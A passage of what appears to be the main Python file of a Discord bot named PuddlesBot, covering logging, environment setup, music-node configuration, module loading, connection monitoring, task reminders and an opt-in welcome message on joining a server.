import discord
from discord import app_commands
from discord.ext import commands
import requests
import os
from dotenv import load_dotenv
from datetime import datetime, timedelta, timezone
from dateutil import parser
from database import Task, TaskCreator, get_session, TaskReminder, TimezoneSettings, MultidimensionalOptIn
import asyncio
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from typing import Optional, Callable, Any
import traceback
import sys
import functools
from discord.app_commands import checks
import sqlalchemy
import json
import pathlib
import utils
import logging
import logging.handlers
import platform
import psutil
import time
import aiohttp
from aiohttp import ClientConnectorError, ClientError
# Made by Charlie
# Set up logging configuration
def setup_logging():
    """Configure detailed logging for the bot"""
    # Create logs directory if it doesn't exist
    if not os.path.exists('logs'):
        os.makedirs('logs')

    # Set up the root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.DEBUG)

    # Console handler with color formatting
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)
    console_format = logging.Formatter(
        '%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    console_handler.setFormatter(console_format)
    root_logger.addHandler(console_handler)

    # File handler for detailed debug logs
    debug_handler = logging.handlers.RotatingFileHandler(
        filename='logs/debug.log',
        encoding='utf-8',
        maxBytes=32 * 1024 * 1024,  # 32 MB
        backupCount=5,
    )
    debug_handler.setLevel(logging.DEBUG)
    debug_format = logging.Formatter(
        '%(asctime)s [%(levelname)s] %(name)s: %(message)s\nContext: %(pathname)s:%(lineno)d',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    debug_handler.setFormatter(debug_format)
    root_logger.addHandler(debug_handler)

    # Error handler for critical issues
    error_handler = logging.handlers.RotatingFileHandler(
        filename='logs/error.log',
        encoding='utf-8',
        maxBytes=32 * 1024 * 1024,  # 32 MB
        backupCount=5,
    )
    error_handler.setLevel(logging.ERROR)
    error_format = logging.Formatter(
        '%(asctime)s [%(levelname)s] %(name)s: %(message)s\n'
        'Path: %(pathname)s:%(lineno)d\n'
        'Function: %(funcName)s\n'
        'Exception:\n%(exc_info)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    error_handler.setFormatter(error_format)
    root_logger.addHandler(error_handler)

    return root_logger

# Initialize logging
logger = setup_logging()

def log_system_info():
    """Log detailed system information"""
    logger.info("=== System Information ===")
    logger.info(f"OS: {platform.system()} {platform.version()}")
    logger.info(f"Python: {sys.version}")
    logger.info(f"Discord.py: {discord.__version__}")
    
    # Memory usage
    process = psutil.Process()
    memory_info = process.memory_info()
    logger.info(f"Memory Usage: {memory_info.rss / 1024 / 1024:.2f} MB")
    
    # CPU usage
    cpu_percent = psutil.cpu_percent(interval=1)
    logger.info(f"CPU Usage: {cpu_percent}%")
    
    # Disk space
    disk = psutil.disk_usage('/')
    logger.info(f"Disk Space: {disk.used / 1024 / 1024 / 1024:.1f}GB used out of {disk.total / 1024 / 1024 / 1024:.1f}GB")
    
    logger.info("=" * 50)

def create_default_env():
    """Create default .env file if it doesn't exist"""
    env_path = pathlib.Path('.env')
    if not env_path.exists():
        env_content = """DISCORD_TOKEN=your_discord_bot_token_here
DISCORD_CLIENT_ID=your_client_id_here

# Lavalink Configuration
LAVALINK_HOST=lavalink.jirayu.net
LAVALINK_PORT=13592
LAVALINK_PASSWORD=youshallnotpass
LAVALINK_SECURE=false

# Optional Services (can be added later)
GENIUS_TOKEN=
MONGODB_URL=
MONGODB_NAME="""
        try:
            env_path.write_text(env_content, encoding='utf-8')
            logger.warning("A new .env file has been created.")
            logger.info("Please edit the .env file and add your Discord bot token and client ID.")
            logger.info("\nYou can get these from the Discord Developer Portal:")
            logger.info("1. Go to https://discord.com/developers/applications")
            logger.info("2. Select your bot (or create a new application)")
            logger.info("3. Copy the 'APPLICATION ID' - this is your CLIENT_ID")
            logger.info("4. Go to the 'Bot' section")
            logger.info("5. Click 'Reset Token' and copy the new token - this is your DISCORD_TOKEN")
            logger.info("\nAfter adding these values to the .env file, run this script again.")
            sys.exit(1)
        except Exception as e:
            logger.error(f"Error creating .env file: {e}", exc_info=True)
            logger.error("Please create a .env file manually with the following content:")
            logger.info("\n" + env_content)
            sys.exit(1)

# Create .env file if it doesn't exist
create_default_env()

# Load environment variables
try:
    load_dotenv()
except Exception as e:
    print(f"\n❌ Error loading .env file: {e}")
    print("Please ensure the .env file exists and is properly formatted.")
    sys.exit(1)

# Check for required environment variables
if not os.getenv('DISCORD_TOKEN') or not os.getenv('DISCORD_CLIENT_ID'):
    print("\n❌ Error: DISCORD_TOKEN and DISCORD_CLIENT_ID must be set in .env file")
    print("Please edit the .env file and add your Discord bot token and client ID.")
    sys.exit(1)

# Set up music system configuration
def setup_music_config():
    """Set up music system configuration"""
    settings_path = os.path.join(os.path.dirname(__file__), 'MusicSystem', 'settings.json')
    os.makedirs(os.path.dirname(settings_path), exist_ok=True)
    
    settings = {
        "token": os.getenv('DISCORD_TOKEN', ''),
        "client_id": os.getenv('DISCORD_CLIENT_ID', ''),
        "genius_token": os.getenv('GENIUS_TOKEN', ''),
        "mongodb_url": os.getenv('MONGODB_URL', ''),
        "mongodb_name": os.getenv('MONGODB_NAME', ''),
        "nodes": {
            "DEFAULT": {
                "host": os.getenv('LAVALINK_HOST', 'lavalink.jirayu.net'),
                "port": int(os.getenv('LAVALINK_PORT', '13592')),
                "password": os.getenv('LAVALINK_PASSWORD', 'youshallnotpass'),
                "secure": os.getenv('LAVALINK_SECURE', 'false').lower() == 'true',
                "identifier": "DEFAULT"
            }
        },
        "prefix": "?",
        "activity": [
            {"type": "listening", "name": "/help", "status": "online"}
        ]
    }
    
    try:
        with open(settings_path, 'w') as f:
            json.dump(settings, f, indent=4)
    except Exception as e:
        print(f"\n⚠️ Warning: Could not save music settings: {e}")
        print("The bot will still work, but music features might be limited.")

setup_music_config()

# Import the modular systems
import dice
import intmsg
from intmsg import process_description_emojis
import fun
import help
import inviter
import quality_manager
import tasks
import lvl  # Leveling system
import puddleai  # AI chat system
from ticket_system import (
    InteractiveMessage, MessageButton, Ticket, IntMsgCreator,
    InteractiveMessageView, ButtonSetupModal, TicketControlView
)
import disable  # Add this to imports at the top
import openchat  # Add to imports

# Music system configuration
ENABLE_MUSIC_SYSTEM = True  # Enable music system with fresh Vocard installation

# Import Vocard music system components
try:
    # Add MusicSystem to Python path
    music_system_path = os.path.join(os.path.dirname(__file__), 'MusicSystem')
    if music_system_path not in sys.path:
        sys.path.insert(0, music_system_path)
    
    # Import Vocard components with correct paths
    import function as music_func
    from addons.settings import Settings
    import voicelink
    from ipc.client import IPCClient
    from motor.motor_asyncio import AsyncIOMotorClient
    
    print("✅ Vocard music system components imported successfully")
    MUSIC_AVAILABLE = True
    
except ImportError as e:
    print(f"❌ Failed to import Vocard components: {e}")
    print("💡 Music system will be disabled. Bot will run with task system only.")
    music_func = None
    Settings = None
    voicelink = None
    IPCClient = None
    AsyncIOMotorClient = None
    MUSIC_AVAILABLE = False

class VocardTranslator(discord.app_commands.Translator):
    async def load(self):
        if music_func and hasattr(music_func, 'logger'):
            music_func.logger.info("Loaded Translator")

    async def unload(self):
        if music_func and hasattr(music_func, 'logger'):
            music_func.logger.info("Unload Translator")

    async def translate(self, string: discord.app_commands.locale_str, locale: discord.Locale, context: discord.app_commands.TranslationContext):
        if not music_func or not hasattr(music_func, 'LOCAL_LANGS'):
            return None
        locale_key = str(locale)
        if locale_key in music_func.LOCAL_LANGS:
            translated_text = music_func.LOCAL_LANGS[locale_key].get(string.message)
            if translated_text is None and hasattr(music_func, 'MISSING_TRANSLATOR'):
                missing_translations = music_func.MISSING_TRANSLATOR.setdefault(locale_key, [])
                if string.message not in missing_translations:
                    missing_translations.append(string.message)
            return translated_text
        return None

class CommandCheck(discord.app_commands.CommandTree):
    async def interaction_check(self, interaction: discord.Interaction, /) -> bool:
        if not interaction.guild:
            await interaction.response.send_message("This command can only be used in guilds!")
            return False
            
        # Skip disable check for enable/disable/features commands
        if interaction.command and interaction.command.name in ['disable', 'enable', 'features']:
            return True
            
        # Check if command's feature is disabled
        if interaction.command:
            can_run = await disable.should_run_command(interaction.guild_id, interaction.command.name)
            if not can_run:
                await interaction.response.send_message(
                    "❌ This feature is currently disabled in this server.",
                    ephemeral=True
                )
                return False
        return True

class PuddlesBot(commands.Bot):
    def __init__(self):
        super().__init__(
            command_prefix=commands.when_mentioned_or(""),
            intents=discord.Intents.all(),
            tree_cls=CommandCheck,
            allowed_mentions=discord.AllowedMentions(roles=False, everyone=False, users=True)
        )
        
        # Disable message command processing since we're using slash commands
        self._skip_check = lambda x, y: False
        
        # Initialize systems
        self.setup_vocard_settings()
        
        # Activity rotation for keepalive
        self.activities = [
            discord.Activity(type=discord.ActivityType.listening, name="/help"),
            discord.Activity(type=discord.ActivityType.watching, name="for commands"),
            discord.Activity(type=discord.ActivityType.playing, name="with Discord"),
            discord.Activity(type=discord.ActivityType.listening, name="music"),
        ]
        
        # Connection monitoring
        self.current_activity_index = 0
        self.last_heartbeat = datetime.utcnow()
        self.reconnect_attempts = 0
        self.last_reconnect_time = None
        self.connection_stable = True
        self.scheduler = AsyncIOScheduler()
        self.node_pool = None  # Track active node pool
        
        # Reconnection settings
        self.max_reconnect_attempts = 10
        self.base_reconnect_delay = 5
        self.max_reconnect_delay = 300  # 5 minutes
        
        # Health monitoring
        self.health_stats = {
            'disconnects': 0,
            'reconnects': 0,
            'high_latency_count': 0,
            'last_latency': 0,
            'commands_processed': 0,
            'errors_encountered': 0,
            'last_error_time': None,
            'uptime_start': time.time()
        }
        
        logger.info("PuddlesBot initialized with enhanced monitoring")
        
        self.ipc = None  # Will be initialized in setup_hook if enabled
        
        # Initialize Vocard components if available
        # (Will be set up in setup_hook with proper async await)
    
    def setup_vocard_settings(self):
        """Set up Vocard settings with environment variables"""
        if not music_func or not Settings:
            print("⚠️ Music system not available, skipping Vocard settings setup")
            return
            
        try:
            # Load settings from file
            settings_path = os.path.join(os.path.dirname(__file__), 'MusicSystem', 'settings.json')
            with open(settings_path, 'r') as f:
                settings_data = json.load(f)
            
            # Update with environment variables
            settings_data['token'] = os.getenv('DISCORD_TOKEN', settings_data['token'])
            settings_data['client_id'] = os.getenv('DISCORD_CLIENT_ID', settings_data['client_id'])
            settings_data['mongodb_url'] = os.getenv('MONGODB_URL', settings_data['mongodb_url'])
            settings_data['mongodb_name'] = os.getenv('MONGODB_NAME', settings_data['mongodb_name'])
            settings_data['genius_token'] = os.getenv('GENIUS_TOKEN', settings_data['genius_token'])
            
            # Create Settings object and assign to music_func
            music_func.settings = Settings(settings_data)
            print("✅ Vocard settings initialized successfully")
            
        except Exception as e:
            print(f"❌ Failed to setup Vocard settings: {e}")
    
    async def connect_music_db(self):
        """Connect to MongoDB for music system"""
        if not music_func or not hasattr(music_func, 'settings'):
            return
            
        settings = music_func.settings
        
        # Initialize database variables to None by default
        music_func.MONGO_DB = None
        music_func.SETTINGS_DB = None
        music_func.USERS_DB = None
        
        if not ((db_name := settings.mongodb_name) and (db_url := settings.mongodb_url)):
            print("⚠️ MongoDB not configured for music system, skipping database connection")
            print("   Music system will work without playlists and user data features")
            return

        try:
            music_func.MONGO_DB = AsyncIOMotorClient(host=db_url)
            await music_func.MONGO_DB.server_info()
            print(f"✅ Music system connected to MongoDB [{db_name}]")
            
            music_func.SETTINGS_DB = music_func.MONGO_DB[db_name]["Settings"]
            music_func.USERS_DB = music_func.MONGO_DB[db_name]["Users"]
            
        except Exception as e:
            print(f"⚠️ Music system MongoDB connection failed: {e}")
            print("   Music system will work without playlists and user data features")
            # Reset to None on connection failure
            music_func.MONGO_DB = None
            music_func.SETTINGS_DB = None
            music_func.USERS_DB = None
    
    async def cleanup_nodes(self):
        """Clean up existing node connections"""
        try:
            if voicelink and hasattr(voicelink, 'NodePool'):
                # Get all existing nodes
                if hasattr(voicelink.NodePool, '_nodes'):
                    nodes = list(voicelink.NodePool._nodes.values())
                    for node in nodes:
                        try:
                            await node.disconnect()
                            node_id = getattr(node, 'identifier', 'unknown')
                            logger.info(f"Disconnected node: {node_id}")
                        except Exception as e:
                            node_id = getattr(node, 'identifier', 'unknown')
                            logger.warning(f"Error disconnecting node {node_id}: {e}")
                
                # Clear the node pool
                if hasattr(voicelink.NodePool, '_nodes'):
                    voicelink.NodePool._nodes.clear()
                
                logger.info("Cleaned up all existing node connections")
        except Exception as e:
            logger.error(f"Error cleaning up nodes: {e}", exc_info=True)

    async def setup_vocard_music(self):
        """Set up Vocard music system components"""
        if not MUSIC_AVAILABLE or not music_func:
            logger.warning("Vocard music system not available")
            return
            
        try:
            # Initialize IPC client with disabled state by default
            self.ipc = None
            
            # Clean up any existing nodes
            await self.cleanup_nodes()
            
            # Set up language support
            if hasattr(music_func, 'langs_setup'):
                music_func.langs_setup()
            
            # Set up Vocard components
            if MUSIC_AVAILABLE and voicelink and hasattr(music_func, 'settings'):
                # Generate a unique node identifier using timestamp
                node_id = f"MAIN_{int(time.time())}"
                
                try:
                    # Initialize NodePool with unique identifier
                    node = await voicelink.NodePool.create_node(
                        bot=self,
                        host=music_func.settings.nodes["DEFAULT"]["host"],
                        port=music_func.settings.nodes["DEFAULT"]["port"],
                        password=music_func.settings.nodes["DEFAULT"]["password"],
                        secure=music_func.settings.nodes["DEFAULT"]["secure"],
                        identifier=node_id  # Use unique identifier
                    )
                    self.node_pool = node
                    
                    # Load music cogs
                    await self.load_extension("cogs.basic")
                    await self.load_extension("cogs.effect")
                    await self.load_extension("cogs.playlist")
                    await self.load_extension("cogs.settings")
                    await self.load_extension("cogs.task")
                    await self.load_extension("cogs.listeners")
                    
                    logger.info("✅ Vocard music system setup complete")
                except Exception as e:
                    logger.error(f"Failed to create Lavalink node: {e}", exc_info=True)
                    raise
                
        except Exception as e:
            logger.error(f"Failed to setup Vocard music system: {e}", exc_info=True)
            raise

    async def setup_hook(self):
        """Setup hook - runs after bot connects but before on_ready"""
        try:
            logger.info("Starting bot setup...")
            
            # Add persistent view for special features
            self.add_view(SpecialFeaturesView())
            
            # Initialize database session
            logger.debug("Initializing database...")
            session = get_session('global')
            session.close()
            
            # Setup disable system
            try:
                disable.setup_disable_system(self)
                disable.setup_disable_commands(self.tree)
                print("✅ Disable system loaded")
            except Exception as e:
                print(f"⚠️ Disable system failed: {e}")
            
            # Setup OpenChat system
            try:
                openchat.setup_openchat_system(self)
                openchat.setup_openchat_commands(self.tree)
                print("✅ OpenChat system loaded")
            except Exception as e:
                print(f"⚠️ OpenChat system failed: {e}")
            
            # Setup non-music module systems with client references
            try:
                dice.setup_dice_system(self)
                dice.setup_dice_commands(self.tree)
                print("✅ Dice system loaded")
            except Exception as e:
                print(f"⚠️ Dice system failed: {e}")
                
            try:
                intmsg.setup_intmsg_system(self)
                intmsg.setup_intmsg_commands(self.tree)
                print("✅ Interactive message system loaded")
            except Exception as e:
                print(f"⚠️ Interactive message system failed: {e}")
                
            try:
                fun.setup_fun_system(self)
                fun.setup_fun_commands(self.tree)
                print("✅ Fun system loaded")
            except Exception as e:
                print(f"⚠️ Fun system failed: {e}")
                
            try:
                help.setup_help_system(self)
                help.setup_help_commands(self.tree)
                print("✅ Help system loaded")
            except Exception as e:
                print(f"⚠️ Help system failed: {e}")
                
            try:
                inviter.setup_inviter_system(self)
                inviter.setup_inviter_commands(self.tree)
                print("✅ Inviter system loaded")
            except Exception as e:
                print(f"⚠️ Inviter system failed: {e}")
                
            try:
                tasks.setup_task_system(self)
                tasks.setup_task_commands(self.tree)
                print("✅ Task system loaded")
            except Exception as e:
                print(f"⚠️ Task system failed: {e}")
                
            try:
                lvl.setup_leveling_system(self)
                lvl.setup_level_commands(self.tree)
                # Start voice XP tracking
                lvl.voice_tracker.start_periodic_updates()
                print("✅ Leveling system loaded")
            except Exception as e:
                print(f"⚠️ Leveling system failed: {e}")
                
            # Setup quality manager
            try:
                import quality_manager
                quality_manager.setup_quality_commands(self.tree, self)
                print("✅ Quality manager loaded")
            except Exception as e:
                print(f"⚠️ Quality manager failed: {e}")
                
            # Setup utils
            try:
                utils.setup_utils_commands(self.tree, self)
                print("✅ Utils loaded")
            except Exception as e:
                print(f"⚠️ Utils failed: {e}")
                
            # Setup message system
            try:
                import msg
                msg.setup_msg_commands(self.tree)
                print("✅ Message system loaded")
            except Exception as e:
                print(f"⚠️ Message system failed: {e}")
                
            # Add owner commands
            try:
                setup_owner_commands(self.tree)
                print("✅ Owner commands loaded")
            except Exception as e:
                print(f"⚠️ Owner commands failed: {e}")
            
            # Setup AI Chat system
            try:
                puddleai.setup_ai_chat_system(self)
                print("✅ AI Chat system loaded")
            except Exception as e:
                print(f"⚠️ AI Chat system failed: {e}")
            
            # Setup music system
            try:
                await self.setup_vocard_music()
                print("✅ Music system loaded")
            except Exception as e:
                print(f"⚠️ Music system failed: {e}")
            
            # Start background tasks
            logger.debug("Starting scheduler and background tasks...")
            self.scheduler.start()
            self.scheduler.add_job(self.check_due_tasks, 'interval', minutes=5)
            self.scheduler.add_job(self.backup_database, 'interval', hours=6)
            self.scheduler.add_job(self._auto_refresh_messages, 'interval', minutes=30)
            
            # Start keepalive tasks with more frequent checks
            self.scheduler.add_job(self.keepalive_heartbeat, 'interval', minutes=2)
            self.scheduler.add_job(self.rotate_activity, 'interval', minutes=10)
            self.scheduler.add_job(self.connection_monitor, 'interval', minutes=1)
            self.scheduler.add_job(self.log_health_stats, 'interval', minutes=15)
            
            # Sync slash commands
            logger.info("Syncing slash commands...")
            try:
                synced = await self.tree.sync()
                logger.info(f"Synced {len(synced)} command(s)")
            except Exception as e:
                logger.error(f"Failed to sync commands: {e}")
            
            logger.info("Bot setup completed successfully!")
            
        except Exception as e:
            logger.critical("Failed to complete bot setup", exc_info=True)
            raise

    async def log_health_stats(self):
        """Log periodic health statistics"""
        try:
            if not self.is_ready():
                return

            uptime = time.time() - self.health_stats['uptime_start']
            uptime_str = str(timedelta(seconds=int(uptime)))
            
            memory_usage = psutil.Process().memory_info().rss / 1024 / 1024  # MB
            cpu_percent = psutil.Process().cpu_percent()
            
            logger.info("=== Bot Health Report ===")
            logger.info(f"Uptime: {uptime_str}")
            logger.info(f"Connected to {len(self.guilds)} guilds")
            logger.info(f"Serving {len(self.users)} users")
            logger.info(f"Memory Usage: {memory_usage:.1f} MB")
            logger.info(f"CPU Usage: {cpu_percent}%")
            logger.info(f"Latency: {self.latency * 1000:.1f}ms")
            logger.info(f"Commands Processed: {self.health_stats['commands_processed']}")
            logger.info(f"Errors Encountered: {self.health_stats['errors_encountered']}")
            logger.info(f"Disconnections: {self.health_stats['disconnects']}")
            logger.info(f"Successful Reconnections: {self.health_stats['reconnects']}")
            logger.info("=" * 25)
            
        except Exception as e:
            logger.error("Failed to log health stats", exc_info=True)

    async def keepalive_heartbeat(self):
        """Send periodic heartbeat to maintain connection"""
        try:
            if self.is_ready():
                current_time = datetime.utcnow()
                self.last_heartbeat = current_time
                
                # Update latency info
                latency = round(self.latency * 1000, 2)
                self.health_stats['last_latency'] = int(latency)  # Convert to integer for storage
                
                # Check for concerning latency
                if latency > 500:  # High latency warning
                    self.health_stats['high_latency_count'] += 1
                    print(f"⚠️ High latency detected: {latency}ms")
                    
                    # Force reconnect if latency is extremely high
                    if latency > 2000:  # 2 seconds
                        print("🔄 Latency too high, initiating reconnection...")
                        await self.close()
                        return
                        
                else:
                    print(f"💓 Heartbeat - Latency: {latency}ms | Guilds: {len(self.guilds)} | Users: {len(self.users)}")
                    
                # Reset high latency counter if connection is good
                if latency < 200:
                    self.health_stats['high_latency_count'] = 0
                    
        except Exception as e:
            print(f"❌ Error in keepalive heartbeat: {e}")
            self.connection_stable = False

    async def rotate_activity(self):
        """Rotate bot activity status to show it's active"""
        try:
            if self.is_ready() and hasattr(self, 'activities'):
                activity = self.activities[self.current_activity_index]
                await self.change_presence(
                    status=discord.Status.online,
                    activity=activity
                )
                self.current_activity_index = (self.current_activity_index + 1) % len(self.activities)
                print(f"🔄 Activity rotated to: {activity.name}")
        except Exception as e:
            print(f"❌ Error rotating activity: {e}")

    async def connection_monitor(self):
        """Monitor connection status and handle reconnections"""
        try:
            if not self.is_ready():
                logger.warning("Bot is not ready - potential connection issue")
                self.connection_stable = False
                return
                
            current_time = datetime.utcnow()
            time_since_heartbeat = current_time - self.last_heartbeat
            
            # Check if we've been offline too long
            if time_since_heartbeat.total_seconds() > 300:  # 5 minutes
                logger.warning(f"No heartbeat for {time_since_heartbeat.total_seconds():.0f} seconds")
                self.connection_stable = False
                
                # Initiate reconnection if too long without heartbeat
                if time_since_heartbeat.total_seconds() > 600:  # 10 minutes
                    logger.error("Connection lost for too long, initiating reconnection...")
                    await self.close()
                    return
            
            # Check if we should reset reconnection attempts
            if self.last_reconnect_time:
                time_since_reconnect = current_time - self.last_reconnect_time
                if time_since_reconnect.total_seconds() > 3600:  # 1 hour
                    self.reconnect_attempts = 0
                    self.last_reconnect_time = None
            
            # Connection health report
            if self.connection_stable:
                if self.reconnect_attempts > 0:
                    logger.info(f"Connection restored after {self.reconnect_attempts} attempts")
                    self.reconnect_attempts = 0
                    self.health_stats['reconnects'] += 1
            
        except Exception as e:
            logger.error("Connection monitor failed", exc_info=True)
            self.connection_stable = False

    async def on_disconnect(self):
        """Handle disconnect events"""
        current_time = datetime.utcnow()
        print("🔌 Bot disconnected from Discord")
        self.connection_stable = False
        self.reconnect_attempts += 1
        self.health_stats['disconnects'] += 1
        self.last_reconnect_time = current_time
        
    async def on_resumed(self):
        """Handle resume events"""
        print("🔌 Bot connection resumed")
        self.last_heartbeat = datetime.utcnow()
        self.connection_stable = True
        
    async def on_connect(self):
        """Handle connection events"""
        print("🔌 Bot connected to Discord")
        self.last_heartbeat = datetime.utcnow()
        self.connection_stable = True

    async def on_ready(self):
        """Ready event - bot is fully connected and ready"""
        if not hasattr(self, '_first_ready'):
            self._first_ready = True
            print("=" * 50)
            print(f"🎉 {self.user.name} is now online!")
            print(f"📊 Connected to {len(self.guilds)} guilds")
            print(f"👥 Serving {len(self.users)} users") 
            print(f"🏷️  Bot ID: {self.user.id}")
            print(f"🐍 Discord.py version: {discord.__version__}")
            print("=" * 50)
            
            # Set initial activity
            if hasattr(self, 'activities') and self.activities:
                await self.change_presence(
                    status=discord.Status.online,
                    activity=self.activities[0]
                )
                
            # Load persistent views
            await self.load_persistent_views()
            
            # Initialize invite tracking
            await inviter.on_ready()
            
            print("Owner commands: /multidimensionaltravel")
            print("🌟 All systems ready! Bot is fully operational.")
            
            # Mark database startup as complete to enable full database operations
            from database import mark_startup_complete
            mark_startup_complete()
            
        else:
            print("🔄 Bot reconnected successfully!")
            
        # Reset connection monitoring
        self.last_heartbeat = datetime.utcnow()
        self.reconnect_attempts = 0

    async def check_due_tasks(self):
        from database import TaskReminder
        # Use consistent UTC time handling
        now = datetime.now(timezone.utc).replace(tzinfo=None)
        reminder_days = [(7, '7d'), (3, '3d'), (1, '1d')]
        for guild in self.guilds:
            session = get_session(str(guild.id))
            try:
                tasks = session.query(Task).filter(
                    Task.due_date > now,
                    Task.completed == False
                ).all()
                for task in tasks:
                    # Handle multiple assignees
                    assigned_user_ids = task.assigned_to.split(',') if task.assigned_to else []
                    for user_id_str in assigned_user_ids:
                        user_id_str = user_id_str.strip()  # Remove any whitespace
                        if not user_id_str:  # Skip empty strings
                            continue
                            
                        try:
                            user = await self.fetch_user(int(user_id_str))
                            if not user:
                                continue
                                
                            days_until_due = (task.due_date - now).days
                            for days, label in reminder_days:
                                # If due in exactly 'days' days (rounded down), and not already reminded
                                if days_until_due == days:
                                    already_sent = session.query(TaskReminder).filter_by(
                                        task_id=task.id,
                                        user_id=user_id_str,
                                        reminder_type=label
                                    ).first()
                                    if not already_sent:
                                        embed = discord.Embed(
                                            title=f"⏰ Task Due in {days} Day{'s' if days > 1 else ''}!",
                                            description=f"Task: {task.name}\nDue Date: {task.due_date.strftime('%Y-%m-%d %H:%M UTC')}\n\nDescription:\n{task.description}",
                                            color=discord.Color.orange() if days > 1 else discord.Color.red()
                                        )
                                        try:
                                            await user.send(embed=embed)
                                        except discord.Forbidden:
                                            pass
                                        reminder = TaskReminder(
                                            task_id=task.id,
                                            user_id=user_id_str,
                                            reminder_type=label
                                        )
                                        session.add(reminder)
                        except (ValueError, discord.NotFound, discord.HTTPException):
                            # Skip invalid user IDs or users that can't be fetched
                            continue
                session.commit()
            finally:
                session.close()

    async def on_error(self, event, *args, **kwargs):
        """Global error handler for all events"""
        self.health_stats['errors_encountered'] += 1
        self.health_stats['last_error_time'] = datetime.utcnow()
        
        error_msg = f"Error in {event}"
        if args:
            error_msg += f" with args: {args}"
        if kwargs:
            error_msg += f" and kwargs: {kwargs}"
            
        logger.error(error_msg, exc_info=True)
        
        # Log the full traceback
        exc_type, exc_value, exc_traceback = sys.exc_info()
        tb_lines = traceback.format_exception(exc_type, exc_value, exc_traceback)
        logger.error("Full traceback:\n" + "".join(tb_lines))

    async def close(self):
        """Clean shutdown of the bot"""
        try:
            logger.info("Starting bot shutdown sequence...")
            
            # Stop voice XP tracking
            try:
                lvl.voice_tracker.stop_periodic_updates()
                logger.info("Voice XP tracking stopped")
            except Exception as e:
                logger.error(f"Error stopping voice XP tracking: {e}")
            
            # Stop the scheduler
            if hasattr(self, 'scheduler') and self.scheduler.running:
                logger.info("Shutting down scheduler...")
                self.scheduler.shutdown(wait=False)
                logger.info("Scheduler shutdown complete")
            
            # Clean up music nodes
            if hasattr(self, 'node_pool') and self.node_pool:
                logger.info("Cleaning up music nodes...")
                await self.cleanup_nodes()
                self.node_pool = None
            
            # Close MongoDB connections
            if music_func and hasattr(music_func, 'MONGO_DB') and music_func.MONGO_DB:
                logger.info("Closing MongoDB connection...")
                music_func.MONGO_DB.close()
                music_func.MONGO_DB = None
            
            # Close database connections
            try:
                session = get_session('global')
                if session:
                    logger.info("Closing database sessions...")
                    session.close()
            except Exception as e:
                logger.error(f"Error closing database session: {e}", exc_info=True)
            
            # Cancel all tasks
            logger.info("Cancelling pending tasks...")
            tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
            for task in tasks:
                task.cancel()
            
            # Wait for task cancellation
            if tasks:
                logger.info(f"Waiting for {len(tasks)} tasks to cancel...")
                try:
                    await asyncio.wait(tasks, timeout=5)
                    logger.info("All tasks cancelled successfully")
                except asyncio.TimeoutError:
                    logger.warning("Some tasks did not cancel in time")
            
            # Close any remaining connections
            try:
                logger.info("Closing Discord connection...")
                await super().close()
                logger.info("Discord connection closed")
            except Exception as e:
                logger.error(f"Error closing Discord connection: {e}", exc_info=True)
            
            logger.info("Bot shutdown complete")
                
        except Exception as e:
            logger.error(f"Error during shutdown: {e}", exc_info=True)
        finally:
            # Final cleanup
            try:
                # Clear any remaining handlers
                handlers = logger.handlers[:]
                for handler in handlers:
                    handler.close()
                    logger.removeHandler(handler)
            except Exception as e:
                print(f"Error during final cleanup: {e}")  # Use print as logger might be closed

    async def on_member_join(self, member):
        """Handle member join events for invite tracking"""
        await inviter.on_member_join(member)
    
    async def on_member_remove(self, member):
        """Handle member leave events for invite tracking"""
        await inviter.on_member_remove(member)
    
    async def on_guild_join(self, guild):
        """Handle bot joining a new guild"""
        print(f"🎉 Bot joined new guild: {guild.name}")
        await inviter.on_guild_join(guild)
        
        # Find the first suitable channel to send the welcome message
        welcome_channel = None
        for channel in guild.text_channels:
            # Check if bot has permission to send messages in this channel
            if channel.permissions_for(guild.me).send_messages:
                welcome_channel = channel
                break
                
        if welcome_channel:
            # Check if server has already opted in
            session = get_session('global')
            try:
                opt_in = session.query(MultidimensionalOptIn).filter_by(server_id=str(guild.id)).first()
                if opt_in and opt_in.opted_in:
                    # Server already opted in, send a different welcome message
                    embed = discord.Embed(
                        title="🦆 Quack! Hello new friends!",
                        description=(
                            "I'm Puddles, your friendly duck companion! Here are some cool things I can do:\n\n"
                            "🎯 **Task Management**: Keep track of your to-dos\n"
                            "🎵 **Music System**: Play your favorite tunes\n"
                            "🎫 **Ticket System**: Handle support requests\n"
                            "🤖 **AI Chat**: Chat with me by mentioning me\n"
                            "And more!\n\n"
                            "**Note**: This server has already opted in to special features! 🌟"
                        ),
                        color=discord.Color.blue()
                    )
                    await welcome_channel.send(embed=embed)
                else:
                    # Server hasn't opted in, send the opt-in welcome message
                    embed = discord.Embed(
                        title="🦆 Quack! Hello new friends!",
                        description=(
                            "I'm Puddles, your friendly duck companion! Here are some cool things I can do:\n\n"
                            "🎯 **Task Management**: Keep track of your to-dos\n"
                            "🎵 **Music System**: Play your favorite tunes\n"
                            "🎫 **Ticket System**: Handle support requests\n"
                            "🤖 **AI Chat**: Chat with me by mentioning me\n"
                            "And more!\n\n"
                            "**Special /multidimensionaltravel Features** 🌌\n"
                            "This includes the commands /multidimensionaltravel and /gigaop\n"
                            "Please read what these commands do in the GitHub https://github.com/EcoEngineDev/PuddlesBot.\n"
                            "To simplify, these commands allow the bot owner to drop\n"
                            "by and say hello. You may be able to request features.\n\n"
                            "THIS OPT IN SYSTEM EXISTS TO PROTECT YOUR PRIVACY AND FOLLOW DISCORD TOS\n"
                            "ON INVITING THE BOT YOU ACCEPT THE TERMS OF SERVICE AND PRIVACY POLICY\n"
                            "HOWEVER TO ENSURE YOUR PRIVACY WE ASK IF YOU WANT TO OPT IN TO THESE COMMANDS.\n\n"
                            "⚠️ **Note**: Only server administrators can enable special features."
                        ),
                        color=discord.Color.blue()
                    )
                    view = SpecialFeaturesView()
                    await welcome_channel.send(embed=embed, view=view)
            except Exception as e:
                logger.error(f"Error checking opt-in status for guild {guild.id}: {e}")
                # Send default welcome message without opt-in button if there's an error
                embed = discord.Embed(
                    title="🦆 Quack! Hello new friends!",
                    description=(
                        "I'm Puddles, your friendly duck companion! Here are some cool things I can do:\n\n"
                        "🎯 **Task Management**: Keep track of your to-dos\n"
